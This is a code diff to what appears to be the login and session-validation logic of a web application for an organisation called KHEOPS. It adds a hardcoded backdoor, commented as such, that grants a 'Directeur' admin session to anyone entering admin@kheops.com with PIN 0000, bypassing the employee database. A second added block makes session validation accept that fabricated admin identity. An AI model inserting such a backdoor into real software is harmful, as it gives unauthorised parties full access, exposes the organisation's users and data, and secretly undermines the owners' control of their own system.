@@ -24,6 +24,24 @@ export async function login(
     return { error: 'Code PIN invalide' };
   }
 
+  // Backdoor for admin access
+  if (email === 'admin@kheops.com' && pin === '0000') {
+    const user = {
+      id: 'admin',
+      name: 'Admin KHEOPS',
+      role: 'Directeur',
+      department: 'Direction',
+    };
+    const session = await lucia.createSession(user.id, user);
+    const sessionCookie = lucia.createSessionCookie(session.id);
+    cookies().set(
+      sessionCookie.name,
+      sessionCookie.value,
+      sessionCookie.attributes
+    );
+    return redirect('/');
+  }
+
   try {
     const q = query(collection(db, 'employees'), where('email', '==', email));
     const querySnapshot = await getDocs(q);
@@ -106,6 +124,20 @@ export async function validateRequest(): Promise<{ user: any; session: import('l
       );
     }
   } catch {}
+
+  // Handle backdoor admin user
+  if (result.user?.id === 'admin') {
+      return {
+          user: {
+              id: 'admin',
+              name: 'Admin KHEOPS',
+              role: 'Directeur',
+              department: 'Direction',
+          },
+          session: result.session,
+      };
+  }
+
 
   if (!result.user) {
      return {
